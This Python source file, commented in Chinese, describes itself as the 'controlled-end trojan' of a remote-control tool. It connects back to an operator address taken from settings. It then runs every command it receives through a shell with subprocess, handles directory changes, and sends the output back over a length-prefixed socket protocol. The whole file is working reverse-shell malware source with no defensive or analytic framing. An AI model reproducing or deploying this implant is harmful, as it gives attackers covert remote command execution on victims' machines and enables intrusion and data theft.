# 受控端木马
# 自己回连服务端,接收命令,执行命令,结果回复给服务端
import os
import socket
import struct
import subprocess
import settings


def exec_cmd(command, code_flag):
    """执行命令函数"""
    command = command.decode("utf-8")
    # 1.处理cd命令
    if command[:2] == "cd" and len(command) > 2:
        try:
            os.chdir(command[3:])
            # 返回当前切换到的路径
            cmd_path = os.getcwd()
            stdout_res = f"切换到 {cmd_path} 路径下"
        except Exception:
            stdout_res = f"系统找不到指定的路径。: {command[3:]}"
    else:
        obj = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)  # 没有一个结束时间  vim 会一直卡在这一行
        stdout_res = obj.stdout.read() + obj.stderr.read()
        # 2.处理无回显命令
        if not stdout_res:
            stdout_res = f"{command} 执行成功"
        else:
            try:
                # cmd执行系统命令的编码
                stdout_res = stdout_res.decode(code_flag)
            except Exception:
                # 如果是打印 utf-8 编码保存的文件
                if code_flag == "gbk":
                    code_flag = "utf-8"
                elif code_flag == "utf-8":
                    code_flag = "gbk"
                stdout_res = stdout_res.decode(code_flag)
    return stdout_res.strip()


def send_data(conn, data):
    """
    发送数据函数 , 解决粘包问题
    :param conn: sock
    :param data: data/cmd
    :return: None
    """
    # 新增发送命令的粘包解决方案
    # 计算命令长度 , 打包发送
    cmd_len = struct.pack('i', len(data))
    conn.send(cmd_len)
    # 发送命令
    if type(data) == str:  # 注意 str 不需要单引号
        data = data.encode("utf-8")
    conn.send(data)  # utf-8编码发送 ,类型是字节
    return


def recv_data(sock, buf_size=1024):
    """
    接收数据函数 , 解决粘包问题
    :param client: client
    :param buf_size: buf_size=1024
    :return: data byte
    """
    # 先接受命令执行结果的长度
    x = sock.recv(4)
    all_size = struct.unpack('i', x)[0]
    # 接收真实数据
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += sock.recv(buf_size)
        recv_size += buf_size
    return data


def main():
    sock = socket.socket()
    sock.connect((settings.IMPLANT_CONNECT_IP, settings.IMPLANT_CONNECT_PORT))
    # 接收数据
    code_flag = "gbk" if os.name == "nt" else "utf-8"
    while 1:
        try:
            cmd = recv_data(sock)
            if cmd == b'exit':
                sock.close()
            # 命令--> 执行
            res = exec_cmd(cmd, code_flag)
            # 发送结果
            send_data(sock, res)
        except Exception:
            sock.close()
            break


if __name__ == '__main__':
    main()
